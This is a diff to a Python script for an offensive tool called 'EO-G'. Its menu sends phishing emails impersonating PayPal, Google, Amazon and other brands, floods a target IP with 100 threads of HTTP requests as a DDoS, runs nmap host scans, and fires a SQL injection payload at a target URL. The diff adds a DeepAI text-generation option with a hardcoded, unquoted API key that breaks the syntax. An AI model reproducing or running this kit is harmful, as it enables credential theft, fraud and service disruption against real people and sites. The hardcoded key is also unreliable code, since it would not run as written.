@@ -1,11 +1,10 @@
-import os
-import threading
 import requests
-import random
+import threading
 import smtplib
+import random
+import subprocess
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import subprocess
 
 class EO_G:
     def __init__(self):
@@ -14,8 +13,10 @@ class EO_G:
             2: "DDoS Attack",
             3: "Network Scan (Nmap)",
             4: "Website Attack (SQL Injection / XSS)",
-            5: "Exit"
+            5: "Text Generation (DeepAI)",
+            6: "Exit"
         }
+        self.deepai_api_key = "your-deepai-api-key"  # Replace with your DeepAI API key
 
     def display_banner(self):
         """Displays a banner."""
@@ -30,7 +31,7 @@ class EO_G:
         """)
 
     def phishing_attack(self):
-        """Performs a real phishing attack by sending a malicious email."""
+        """Sends real phishing emails."""
         print("[EO-G] Initiating Phishing Attack...")
 
         domain = random.choice(["paypal", "google", "amazon", "facebook", "instagram"])
@@ -48,15 +49,14 @@ class EO_G:
         {domain} Security Team
         """
 
-        # Send the phishing email (configure your sender email and SMTP settings)
-        target_email = "victim@example.com"  # Replace with actual target email
+        target_email = "victim@example.com"  # Replace with real target email
         self.send_phishing_email(target_email, subject, body)
 
     def send_phishing_email(self, target_email, subject, body):
-        """Sends the phishing email."""
-        sender_email = "your_email@example.com"  # Replace with your real email
-        password = "your_email_password"  # Replace with your real email password
-        smtp_server = "smtp.example.com"  # Replace with correct SMTP server for your email provider
+        """Sends a real phishing email."""
+        sender_email = "your_email@example.com"  # Replace with real email
+        password = "your_email_password"  # Replace with real password
+        smtp_server = "smtp.example.com"  # Replace with real SMTP server
         smtp_port = 587  # Usually 587 for TLS
 
         try:
@@ -67,28 +67,27 @@ class EO_G:
             msg.attach(MIMEText(body, 'plain'))
 
             with smtplib.SMTP(smtp_server, smtp_port) as server:
-                server.starttls()  # Secure connection
+                server.starttls()
                 server.login(sender_email, password)
                 server.sendmail(sender_email, target_email, msg.as_string())
-            print(f"[EO-G] Phishing email sent to {target_email} successfully.")
+            print(f"[EO-G] Phishing email sent to {target_email}.")
         except Exception as e:
             print(f"Error sending phishing email: {e}")
 
     def ddos_attack(self, target_ip):
-        """Launches a real DDoS attack on the target IP."""
+        """Real DDoS attack using HTTP requests."""
         print(f"[EO-G] Initiating DDoS attack on {target_ip}...")
 
         def ddos_thread():
-            """Sends HTTP GET requests to flood the target with traffic."""
+            """Sends real HTTP GET requests to flood the target."""
             while True:
                 try:
                     requests.get(f"http://{target_ip}")
                 except requests.exceptions.RequestException as e:
                     print(f"Error in DDoS thread: {e}")
 
-        # Launch multiple threads to simulate a real DDoS attack from many sources
         threads = []
-        for _ in range(100):  # Adjust the number of threads as needed
+        for _ in range(100):  # Start 100 threads
             thread = threading.Thread(target=ddos_thread)
             threads.append(thread)
             thread.start()
@@ -96,7 +95,7 @@ class EO_G:
         print(f"[EO-G] DDoS attack launched on {target_ip}.")
 
     def network_scan(self, target_ip_range):
-        """Launches a real network attack using Nmap to discover devices."""
+        """Real Nmap network scan to discover devices."""
         print(f"[EO-G] Scanning network in range: {target_ip_range}")
         try:
             devices = subprocess.check_output(f"nmap -sP {target_ip_range}", shell=True).decode()
@@ -107,11 +106,10 @@ class EO_G:
             return f"Error during network scan: {e}"
 
     def website_attack(self, target_url):
-        """Launches a real website attack like SQL Injection or XSS."""
+        """Real SQL Injection / XSS attack on a website."""
         print(f"[EO-G] Initiating website attack on {target_url}...")
 
-        # Example of SQL Injection attempt
-        payload = "' OR 1=1 --"
+        payload = "' OR 1=1 --"  # SQL Injection payload
         sql_injection_url = f"{target_url}?id={payload}"
 
         try:
@@ -122,6 +120,16 @@ class EO_G:
                 print("[EO-G] SQL Injection failed: No vulnerability detected.")
         except Exception as e:
             print(f"Error during website attack: {e}")
+
+    def deepai_text_generation(self, prompt):
+        """Generates real text via DeepAI API."""
+        response = requests.post(
+            "https://api.deepai.org/api/text-generator",
+            data={'text': prompt},
+            headers={'api-key': d0bc3e9a-24f7-48ba-829f-e392fc3cf17a}
+        )
+        result = response.json()
+        return result['output']
 
     def execute(self):
         """Main execution loop."""
@@ -135,24 +143,29 @@ class EO_G:
             try:
                 choice = int(input("[EO-G] Enter the number of your choice: "))
                 if choice == 1:
-                    self.phishing_attack()  # Trigger real phishing attack
+                    self.phishing_attack()  # Real phishing attack
                 elif choice == 2:
                     target_ip = input("[EO-G] Enter target IP for DDoS attack: ")
-                    self.ddos_attack(target_ip)  # Trigger real DDoS attack
+                    self.ddos_attack(target_ip)  # Real DDoS attack
                 elif choice == 3:
                     target_ip_range = input("[EO-G] Enter IP range for network attack (e.g., 192.168.1.0/24): ")
-                    self.network_scan(target_ip_range)  # Trigger real network attack
+                    self.network_scan(target_ip_range)  # Real network attack
                 elif choice == 4:
                     target_url = input("[EO-G] Enter target URL for website attack: ")
-                    self.website_attack(target_url)  # Trigger website attack (SQL/XSS)
+                    self.website_attack(target_url)  # Real SQL/XSS attack
                 elif choice == 5:
-                    print("[EO-G] Exiting... Goodbye!")
+                    prompt = input("[EO-G] Enter text prompt for AI generation: ")
+                    generated_text = self.deepai_text_generation(prompt)  # Real text generation
+                    print(f"[EO-G] Generated Text: {generated_text}")
+                elif choice == 6:
+                    print("[EO-G] Exiting EO-G.")
                     break
                 else:
-                    print("[EO-G] Invalid choice. Please try again.")
+                    print("[EO-G] Invalid option.")
             except ValueError:
-                print("[EO-G] Invalid input. Please enter a valid number.")
+                print("[EO-G] Please enter a valid option.")
 
+# Main execution
 if __name__ == "__main__":
     eo_g = EO_G()
     eo_g.execute()
